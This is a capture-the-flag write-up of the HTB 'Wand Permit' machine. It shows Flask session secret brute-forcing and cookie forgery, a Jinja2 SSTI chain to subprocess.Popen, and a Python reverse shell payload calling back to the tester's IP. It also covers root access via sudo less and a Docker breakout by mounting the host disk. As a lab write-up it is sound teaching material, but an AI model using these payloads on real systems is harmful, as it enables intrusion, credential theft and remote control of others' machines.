# HTB University CTF 2022 - `Fullpwn` - Wand Permit

Start: 2nd December 2022 - 10:41pm

End: 6th December 2022 - 1:26pm

Setup
```console
$ export IP=10.129.255.242
$ mkdir nmap
```
Added `wandpermit.htb` to `/etc/hosts`.

Initial Scan
```
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]

$ cat nmap/inital | grep open
80/tcp   open  http       syn-ack Werkzeug/2.2.2 Python/3.8.10
5432/tcp open  postgresql syn-ack PostgreSQL DB 9.6.0 or later
```

Full Port Scan
```
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED]
80/tcp   open  http       syn-ack ttl 62
5432/tcp open  postgresql syn-ack ttl 62
```
No additional **TCP** ports open.

Visiting at the web server resulted in a login page.

Scanning for directories with `dirb/common.txt`:
```console
$ gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -t 20 -o gobuster/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.255.242
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/02 09:53:43 Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 302) [Size: 197] [--> login]
/forgotpassword       (Status: 200) [Size: 1245]
/login                (Status: 200) [Size: 1445]
/logout               (Status: 302) [Size: 197] [--> login]
/meetings             (Status: 302) [Size: 197] [--> login]
/robots.txt           (Status: 200) [Size: 46]
/search               (Status: 302) [Size: 197] [--> login]
Progress: 4392 / 4615 (95.17%)===============================================================
2022/12/02 09:53:52 Finished
===============================================================
```

`/robots.txt` revealed the following information:
```
User-agent: * 
Disallow: /static/CHANGELOG.txt
```

In `/static/CHANGELOG.txt`:
```
Version 2.4.0
-------------------------
- Removed hardcoded secrets on core.js, might need more cleaning on other files

Version 2.3.0
------------------------
- Added manifest plugin to webpack for an upcoming feature

Version 2.2.0
------------------------
- Cleaned up unused files

Version 2.1.0
------------------------
- Temporarily disabled registrations to normal users due to issues again

Version 2.0.0
------------------------
- Added special feature that allows only developers to access certain features

Version 1.3.0
------------------------
- Added webpack for static file bundling

Version 1.2.0
------------------------
- Added base45 encoding support for the new Wizard ID's

Version 1.1.0
------------------------
- Fixed issues on registration

```

Found a url in `/static/main-bundle.js`:
```
/testing/dev/api/v3/register
```
But upon visiting the link, it says we need to access it as developer. Then we get redirected back to `/login`.

`CHANGELOG.txt` mentioned about `manifest`, I googled about `manifest plugins`, and eventually I saw [this thread](https://stackoverflow.com/questions/57661590/purpose-of-webpack-manifest-plugin-in-webpack).

It says:
> WebpackManifestPlugin uses Webpack's manifest data data to emit a JSON file (that you can call manifest.json or whatever you want).

So I gave a shot at `/static/manifest.json`, and this is what I got:
```json
{
  "main.css": "auto/minicssextract.css",
  "main.js": "auto/main-bundle.js",
  "dev.js": "auto/dev-48644bcc829deeffe29e-bundle.js"
}
```

Now I have access to another minified javascript file! As javascript files are served in the `/static` directory, I went to `/static/dev-48644bcc829deeffe29e-bundle.js`. In that file, this variable caught my attention:
```js
const t = ["5306hZYOBb", "46144oFYHui", "2092674nyhxib", "1328703RvoYdl", "1809168oMTOCe", "getTime", "expires=", "9561972IksZju", "x-debug-key-v3", "038663befb1ad868a62035cf5d685adb", "cookie", "2122473ZOLSGJ", "1224815cYPzDr", "toUTCString", "setTime"];
```
It looks like some random value plus a `cookie` to me. My instinct told me that `x-debug-key-v3` and `038663befb1ad868a62035cf5d685adb` is the value of the cookie.

So I try to make a curl request to `/testing/dev/api/v3/register` with the cookie:
```
$ curl http://wandpermit.htb/testing/dev/api/v3/register --cookie "x-debug-key-v3=038663befb1ad868a62035cf5d685adb" 
```

And I can view the page without being redirected! It is a form to register a new user.

For easier access, I added the cookie to my browser using the console:
```console
document.cookie = "x-debug-key-v3=038663befb1ad868a62035cf5d685adb";
```
Then I refresh the page to fill in the form with the following details:
```
Email: test@test.com
Password: test
First Name: test
Last Name: test
Address: test
City: test
Date of Birth: 32/22/2333
```

Then I proceed to login with the email and password. Upon login, we are given a cookie named `session`.

At this point, these are my thoughts:
1. `/meetings`, but it says we need to be staff to view this page. So i think it should be JWT related.
2. SQLinjection, but whenever I inject something like `1;(select 1 from pg_sleep(5))`, or running sqlmap, the web server crashes. It becomes `INTERNAL SERVER ERROR  500` and I have to restart the instance.
3. `/verification`, there'a QR code and it translates to the following string:
```
MPFPEDWE4$96JF6UF4B$DXEDWE41G49$CVKETPEB$DD3DSPC7ECJUDUPC%ZD3Q5R.C4LE1WE..DF$DWE4EF4VKEP$D:KEIE4$F4HEC1WE..DF$DWE4/E4$/EHECIE4QF45VCZKEZQEWE4CF4V9EZEDU1D82B VD.OE9F63Q5OPCRWEWE4GF46$CSUENT93/DTVDHWEO-D3Q5GVCCICWF70A6QF65W55W5+K6Z2
```
  I have no idea what it means. But we are required to upload a photo of `Wizard ID` to verify our account. I uploaded the example photo given and it says im verified, idk how it checks for the photo but the JWT changed abit after verification.

4. In `scheduling a meeting`, I've tried injecting `XSS`, `SSTI` in the `city` parameter, but it is not working.

> So after struggling for a long time, I finally found out that it wasn't a JWT, it is actually a Flask cookie. I'm new to these kind of stuff, but eventually I made my way out.

I followed the steps [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) to exploit the cookie.

Original flask cookie:
```
eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOmZhbHNlLCJ2ZXJpZmllZCI6ZmFsc2V9.Y46zoA.9I8sM1M3FxS8cKtzTOCp5-43qbI
```

Bruteforce the `secret` of the cookie using `flask-unsign`:
```console
$ flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --cookie 'eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOmZhbHNlLCJ2ZXJpZmllZCI6ZmFsc2V9.Y46zoA.9I8sM1M3FxS8cKtzTOCp5-43qbI' --no-literal-eval
[*] Session decodes to: {'email': 'test@test.com', 'id': 9, 'staff': False, 'verified': False}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1261312 attemptsmehunnamaaaa
b'sss'
```
Found secret: `sss`

Then we modify the content of the cookie to:
```
{'email': 'test@test.com', 'id': 9, 'staff': True, 'verified': True}
```

Then we sign the cookie using the `secret`:
```console
$ flask-unsign --sign --cookie "{'email': 'test@test.com', 'id': 9, 'staff': True, 'verified': True}" --secret sss
eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOnRydWUsInZlcmlmaWVkIjp0cnVlfQ.Y462rg.31MPokG7VDS4PPDKzM8ZSIDE1Yc
```

Now we have the malicious cookie:
```
eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6OSwic3RhZmYiOnRydWUsInZlcmlmaWVkIjp0cnVlfQ.Y462rg.31MPokG7VDS4PPDKzM8ZSIDE1Yc
```

Then we can proceed to `/meetings`. I saw a list of user emails, and I saved them into `emails.txt`.
```
afredericks@spell_chaser.wiz
gwilliams@apricus.wiz
jkeneth@susurrus.wiz
dmachin@rowan.wiz
gmulciber@praxis.wiz
bcallidora@macedon.wiz
smoore@ourios.wiz
nburke@phaidros.wiz
```

I wrote a python script to generate the token for all of the users in `emails.txt`, and then to view their `User Information` in `/app`:
```python
#!/usr/bin/python3

import os
import subprocess
import requests
import json

f = open("emails.txt", "r")

emails = f.readlines()

ok_emails = []

for i in emails:
  if '\n' in i:
    i = i.rstrip('\n')
  ok_emails.append(i)

print(ok_emails)

for index,val in enumerate(ok_emails):
  cmd = "flask-unsign --sign --cookie \"" + "{'email': '" + val + "', 'id': " + str(index+1) + ", 'staff': True, 'verified': True}" + "\" --secret sss"
  print(cmd)
  cookie = subprocess.getoutput(cmd)
  print(cookie + "\n")
  r = requests.get('http://wandpermit.htb/app', cookies={"session":cookie})
  print(r.text)
```

But I didn't see anything useful here.

But then I noticed there's another search form at `/meetings`. The regex requires us to enter something like `user@mail.com`. So I sent the request in Burpsuite to get rid of the regex limitation.

After trying for different kinds of payloads, it was vulnerable to `SSTI`. The payload was `{{7*7}}`. The value `49` was reflected on the page.

## Exploiting the Server Side Template Injection `SSTI`

> I followed the steps [here](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee).

First, I would check for the inherited classes of an object type `string`. The payload will be `{{''.__class__.__mro__}}` (remember to URL encode if required)

Response:
```
(&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)
```

It is HTML encoded twice, so after decoding:
```
(<class 'str'>, <class 'object'>)
```

Then we'll have to access to second item `<class 'object'>`, and view its subclasses. The payload will be `{{''.__class__.__mro__[1].__subclasses__()}}`. The response is too long so I won't show it here. But we need to find the index of the subclass we want to access. For our case, we want to execute system commands, so we need to find for subclasses like `subprocess.Popen` or `os.system`.

I copied the response, decoded it and saved it into `subclasses.txt`. Then I wrote a python script to find out the index of the subclass we need.
```python
#!/usr/bin/python3

f = open("subclasses.txt", "r")

text = f.read()

text = text.split(', ')

for index,val in enumerate(text):
  if "subprocess" in val or "system" in val:
    print(str(index) + " - " + val)
```

Output:
```
396 - <class 'subprocess.CompletedProcess'>
397 - <class 'subprocess.Popen'>
```

So `subprocess.Popen` is at index `397`.

Then we can proceed to call the class tailed with its respective arguments:
```
{{''.__class__.__mro__[1].__subclasses__()[397]("id",shell=True,stdout=-1).communicate()}}
```

Response:
```
(b'uid=1000(sparkles) gid=1000(sparkles) groups=1000(sparkles)\n', None)
```

We have achieved RCE! Now we can escalate to a reverse shell.

I grabbed a Python reverse shell from [revshells.com](https://www.revshells.com/) and put it in the payload.

Before actually sending the payload, I have to make sure the box has `python`. I quickly verified by using the `which python` command, but the response was blank, meaning the box does not have python. Then I tried `python3` and I got a response. So we have to change the reverse shell payload from `python` to `python3` in order to work properly.

I then get ready my netcat listener:
```console
$ nc -lnvp 9999
listening on [any] 9999 ...
```

Send the payload:
```
{{''.__class__.__mro__[1].__subclasses__()[397]("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.3\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",shell=True,stdout=-1).communicate()}}
```

On my listener:
```console
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.255.160] 42210
$ whoami
whoami
sparkles
$ id
id
uid=1000(sparkles) gid=1000(sparkles) groups=1000(sparkles)
$ bash -i
bash -i
sparkles@d08d143f2369:~/app$ 
```

### We are in as `sparkles@d08d143f2369`.

The ***user flag*** is at `/home/sparkles/user.txt`.

> The hostname reveals that we might be inside a docker. I quickly verified it by viewing the `/` directory, and there was `.dockerenv` file there. We are actually in a docker.

## `sparkles` to `root`

First, I run a sudo check:
```console
sparkles@d08d143f2369:~/app$ sudo -l
sudo -l
Matching Defaults entries for sparkles on d08d143f2369:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sparkles may run the following commands on d08d143f2369:
    (ALL) NOPASSWD: /usr/bin/less
```

We are able to run `/usr/bin/less` as sudo without password.

[Gtfo.bins](https://gtfobins.github.io/gtfobins/less/) tells that we can perform privilege escalation by abusing `sudo` with `less`.

```console
sparkles@d08d143f2369:~/app$ sudo /usr/bin/less /etc/profile
sudo /usr/bin/less /etc/profile
WARNING: terminal is not fully functional
/etc/profile  (press RETURN)!/bin/sh
!//bbiinn//sshh!/bin/sh
# whoami
whoami
root
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 
```

### We are now `root`!

> There's no root flag?

There's an `.env` file at `/home/sparkles/app`, it reveals the following information:
```console
# cat .env
cat .env
DB_PORT=5432
DB_HOST=postgres
DB_USER=sparkles
DB_PASSWORD=e6136cd757fb346df1bf08a3de5417191
DB_NAME=wand_permit
```

Since the PostgreSQL service is exposed to us, I'll try to connect to it from my box.
```console
$ psql -h wandpermit.htb -U sparkles                                                                              
Password for user sparkles: 
psql (15.0 (Debian 15.0-1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.
```

But I couldn't find anything useful here.

Since, we are in a docker, we should probably escape it somehow to gain further access.

After googling for a while, it came up with [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1).

The command `docker` was not available inside the docker container, so I tried others, until `fdisk` worked.

> Well configured docker containers won't allow command like fdisk -l. However on miss-configured docker command where the flag --privileged or --device=/dev/sda1 with caps is specified, it is possible to get the privileges to see the host drive.

```console
# fdisk -l
fdisk -l
Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
Disk model: Virtual disk    
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 41CE987E-9096-408E-A257-E218FB471DD7

Device      Start      End  Sectors  Size Type
/dev/sda1    2048     4095     2048    1M BIOS boot
/dev/sda2    4096   528383   524288  256M Linux filesystem
/dev/sda3  528384 16775167 16246784  7.8G Linux LVM


Disk /dev/dm-0: 5.99 GiB, 6408896512 bytes, 12517376 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/dm-1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
```

There are 2 additional drives available for us, `dm-0` and `dm-1`. So I tried to mount `dm-0` first to `/tmp/test`.

```console
# mkdir /tmp/test
mkdir /tmp/test

# mount /dev/dm-0 /tmp/test
mount /dev/dm-0 /tmp/test
```

It didn't return an error, so I proceed to view the files in it.

```console
# ls -l /tmp/test
ls -l /tmp/test
total 76
lrwxrwxrwx   1 root root     7 Aug  9 11:53 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Nov 22 22:25 boot
drwxr-xr-x   4 root root  4096 Aug  9 11:56 dev
drwxr-xr-x 107 root root  4096 Nov 29 13:41 etc
drwxr-xr-x   3 root root  4096 Nov 23 23:34 home
lrwxrwxrwx   1 root root     7 Aug  9 11:53 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Aug  9 11:53 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Aug  9 11:53 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Aug  9 11:53 libx32 -> usr/libx32
drwx------   2 root root 16384 Nov 22 22:25 lost+found
drwxr-xr-x   2 root root  4096 Aug  9 11:53 media
drwxr-xr-x   2 root root  4096 Aug  9 11:53 mnt
drwxr-xr-x   3 root root  4096 Nov 23 23:37 opt
drwxr-xr-x   2 root root  4096 Apr 18  2022 proc
drwx------   4 root root  4096 Nov 29 12:20 root
drwxr-xr-x  13 root root  4096 Aug  9 11:58 run
lrwxrwxrwx   1 root root     8 Aug  9 11:53 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Aug  9 11:53 srv
drwxr-xr-x   2 root root  4096 Apr 18  2022 sys
drwxrwxrwt  12 root root  4096 Dec  6 06:05 tmp
drwxr-xr-x  14 root root  4096 Aug  9 11:53 usr
drwxr-xr-x  12 root root  4096 Nov 22 22:37 var
```

It was actually another system's drive, and the ***root flag*** can be found at `/temp/test/root/root.txt`.

I was about to explore more on the another drive `dm-1`, but after submitting the root flag, the challenge got terminated, and I cannot spawn the instance anymore.
